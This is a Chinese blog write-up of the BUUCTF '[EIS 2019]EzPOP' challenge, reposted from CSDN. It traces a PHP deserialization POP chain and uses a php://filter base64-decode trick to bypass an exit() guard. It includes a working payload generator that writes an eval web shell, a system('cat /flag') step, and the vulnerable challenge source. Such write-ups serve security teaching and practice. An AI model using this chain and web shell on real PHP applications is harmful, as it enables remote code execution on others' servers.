<!--yml
category: 未分类
date: 2022-04-26 14:43:31
-->

# BUUCTF__[EIS 2019]EzPOP_题解_风过江南乱的博客-CSDN博客

> 来源：[https://blog.csdn.net/TM_1024/article/details/116208390](https://blog.csdn.net/TM_1024/article/details/116208390)

## 前言

## 解题

*   最后有一个反序列化函数`unserialize`来推一波poc利用链。

*   从后往前推，首先看到`file_put_contents`函数，可以写入webshell文件。

*   再来看看两个参数。其中可以看到`data`，经过了拼接处理，其中有一个exit好像不太行，但我们可以利用php伪协议绕过，看看这篇详情介绍[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list)

    ```
    $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data; 
    ```

*   往上，虽然有个数据压缩的代码，但是只需要`options['data_compress']`为假就不进入if不执行，经过了`serialize`函数，但这个函数并非是序列化函数，而是在`class B`中自定义的`serialize`函数。

*   但是`$value`变量来自`class A`中调用`set`函数时传递的`$contents`变量。那么class是怎么调用`class B`中的`set`函数，首先魔术方法`__destruct()`在反序列化时被调用，if一个 `!$this->autosave`，这就要求`$this->autosave`为假，然后是调用`save()`函数，其中的`$this->store->set();`完成调用，这就要求`$this->store`为`class B`的对象。

*   在往上，`$contents`变量来自函数`getForStorage();`的返回值，其中参数为数组`[$cleaned, $this->complete]`，两个选择，第一让`$cleaned`为shell内容，第二就是`$complete`,显然`$complete`更简单，所以让`$complete`为shell内容，那么`$cleaned`为一个空数组就行了。

*   再来看看`filename`，往上找的一个就是函数`getCacheKey($name);`的返回值，返回的是`options['prefix'] . $name;`两个变量拼接,其中`$name`来自`class A`中调用`set`函数时传递的`$key`变量。结束。

*   然后就再来看看具体的paylaod。

*   首先调用`class B`中`set`函数的条件`$this->autosave=false`， `$this->store=new B()`;

*   再是shell路径`$this->key = "php://filter/write=convert.base64-decode/resource=shell.php";`，`options['prefix']`不要也行，反正只是拼接。

*   然后来看shell内容，首先绕过数据压缩`$this->options['data_compress'] = false;`

*   然后是让`$cleaned`为空数组，它调用了`cleanContents($this->cache);`因为函数参数是数组类型，所以让`$this->cache=array();`为一个空数组，防止调用报错。

*   最后是shell内容，`$this->complete = base64_encode("xxx".base64_encode('<?php @eval($_GET["1"]);?>'));`，`$this->options['serialize'] = 'base64_decode';`

*   第一次编码是为了绕过exit，第二次是为了防止出错，但中间拼接的`'xxx'`的作用是啥？

*   base64算法解码时是4个字节一组，如果直接伪协议base64解码前面拼接内容`"<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n"`如果不足4的倍数会向后取三位补足4的倍数，破坏我们的shell内容，所以我们加上字符补全，来看看需要补多少个字符。

*   `sprintf('%012d', $expire)`不用管，输出12个字节刚好。由于`<、?、()、;、>、\n`都不是base64编码的范围，所以base64解码的时候会自动将其忽略，所以剩下`phpexit`九个字节，补三个。

*   payload

```
<?php
class A{
    protected $store;
    protected $key;
    protected $expire;

    public function __construct()
    {
        $this->cache = array();
        $this->complete = base64_encode("xxx".base64_encode('<?php @eval($_GET["1"]);?>'));
        $this->key = "php://filter/write=convert.base64-decode/resource=1.php";
        $this->store = new B();
        $this->autosave = false;
    }

}
class B{
    public $options = array();
    function __construct()
    {
        $this->options['serialize'] = 'base64_decode';
        $this->options['data_compress'] = false;
    }
}
echo urlencode(serialize(new A()));
?> 
```

*   结束，运行生成payload，访问src=1&data=paylaod写入shell，再访问`1.php?1=system('cat /flag');`会·获取flag。
*   补上源码

```
<?php
error_reporting(0);

class A {

    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);

        return json_encode([$cleaned, $this->complete]);
    }

    public function save() {
        $contents = $this->getForStorage();

        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {
            $this->save();
        }
    }
}

class B {

    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        return $this->options['prefix'] . $name;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {

            }
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {

            $data = gzcompress($data, 3);
        }

        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;

        $result = file_put_contents($filename, $data);

        if ($result) {
            return true;
        }

        return false;
    }

}

if (isset($_GET['src']))
{
    highlight_file(__FILE__);
}

$dir = "uploads/";

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET["data"]); 
```

## 总结

*   反序列化题目，先找到最后的利用点，然后往前推利用链，一步一步往上找调用点，最终推到输入点，串起来就行了。